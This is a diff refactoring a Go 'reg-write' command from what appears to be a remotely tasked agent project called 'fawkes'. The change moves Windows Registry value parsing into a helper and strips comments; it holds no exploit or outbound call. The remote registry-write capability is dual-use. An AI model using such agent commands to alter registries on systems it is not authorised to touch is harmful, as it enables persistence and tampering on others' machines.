@@ -4,11 +4,8 @@
 package commands
 
 import (
-	"encoding/hex"
 	"encoding/json"
 	"fmt"
-	"strconv"
-	"strings"
 
 	"fawkes/pkg/structs"
 
@@ -18,15 +15,8 @@ import (
 // RegWriteCommand implements the reg-write command
 type RegWriteCommand struct{}
 
-// Name returns the command name
-func (c *RegWriteCommand) Name() string {
-	return "reg-write"
-}
-
-// Description returns the command description
-func (c *RegWriteCommand) Description() string {
-	return "Write a value to the Windows Registry"
-}
+func (c *RegWriteCommand) Name() string        { return "reg-write" }
+func (c *RegWriteCommand) Description() string { return "Write a value to the Windows Registry" }
 
 // RegWriteParams represents the JSON parameters
 type RegWriteParams struct {
@@ -37,7 +27,6 @@ type RegWriteParams struct {
 	RegType string `json:"reg_type"`
 }
 
-// Execute implements the Command interface
 func (c *RegWriteCommand) Execute(task structs.Task) structs.CommandResult {
 	var params RegWriteParams
 	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
@@ -65,7 +54,6 @@ func (c *RegWriteCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Open or create the key
 	key, _, err := registry.CreateKey(hiveKey, params.Path, registry.SET_VALUE)
 	if err != nil {
 		return structs.CommandResult{
@@ -76,58 +64,7 @@ func (c *RegWriteCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 	defer key.Close()
 
-	// Write the value based on type
-	switch strings.ToUpper(params.RegType) {
-	case "REG_SZ":
-		err = key.SetStringValue(params.Name, params.Data)
-	case "REG_EXPAND_SZ":
-		err = key.SetExpandStringValue(params.Name, params.Data)
-	case "REG_DWORD":
-		val, parseErr := strconv.ParseUint(params.Data, 10, 32)
-		if parseErr != nil {
-			// Try hex
-			val, parseErr = strconv.ParseUint(strings.TrimPrefix(params.Data, "0x"), 16, 32)
-			if parseErr != nil {
-				return structs.CommandResult{
-					Output:    fmt.Sprintf("Error: invalid DWORD value '%s' (use decimal or 0x hex)", params.Data),
-					Status:    "error",
-					Completed: true,
-				}
-			}
-		}
-		err = key.SetDWordValue(params.Name, uint32(val))
-	case "REG_QWORD":
-		val, parseErr := strconv.ParseUint(params.Data, 10, 64)
-		if parseErr != nil {
-			val, parseErr = strconv.ParseUint(strings.TrimPrefix(params.Data, "0x"), 16, 64)
-			if parseErr != nil {
-				return structs.CommandResult{
-					Output:    fmt.Sprintf("Error: invalid QWORD value '%s' (use decimal or 0x hex)", params.Data),
-					Status:    "error",
-					Completed: true,
-				}
-			}
-		}
-		err = key.SetQWordValue(params.Name, val)
-	case "REG_BINARY":
-		binData, parseErr := hex.DecodeString(strings.TrimPrefix(params.Data, "0x"))
-		if parseErr != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error: invalid binary hex data '%s': %v", params.Data, parseErr),
-				Status:    "error",
-				Completed: true,
-			}
-		}
-		err = key.SetBinaryValue(params.Name, binData)
-	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: unsupported registry type '%s' (use REG_SZ, REG_EXPAND_SZ, REG_DWORD, REG_QWORD, or REG_BINARY)", params.RegType),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-
-	if err != nil {
+	if err := parseRegWriteValue(key, params.Name, params.Data, params.RegType); err != nil {
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("Error writing value: %v", err),
 			Status:    "error",
